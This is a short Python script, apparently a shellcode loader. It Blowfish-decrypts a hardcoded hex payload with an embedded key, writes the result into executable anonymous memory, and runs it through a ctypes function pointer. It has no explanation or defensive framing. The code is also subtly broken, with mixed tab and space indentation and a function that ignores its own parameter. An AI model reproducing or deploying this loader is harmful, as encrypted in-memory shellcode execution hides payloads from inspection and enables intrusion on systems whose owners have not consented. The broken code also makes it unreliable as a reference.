from Crypto.Cipher import Blowfish
import mmap
import ctypes



def decrypt(data):
	crypt_obj = Blowfish.new('12ejkwirpoernsor', Blowfish.MODE_ECB)
	plaintext = crypt_obj.decrypt(data)
        return plaintext

def mem_map(data):
        shell_code = data
        mm = mmap.mmap(-1, len(shell_code), flags=mmap.MAP_SHARED | mmap.MAP_ANONYMOUS, prot=mmap.PROT_WRITE | mmap.PROT_READ | mmap.PROT_EXEC)
        mm.write(shell_code)
        return mm
def func_ptr(mm1):
        restype = ctypes.c_int64
        argtypes = tuple()
        ctypes_buffer = ctypes.c_int.from_buffer(mm)
        function = ctypes.CFUNCTYPE(restype, *argtypes)(ctypes.addressof(ctypes_buffer))
        function()

if __name__ == "__main__":
	ciphertext = bytes("50835d6cb057e4ad7227869ed9bfaadc41163602f7820895525cdab448ecf3eb")
	plaintext = decrypt(ciphertext.decode("hex"))
	mm = mem_map(plaintext)
	func_ptr(mm)
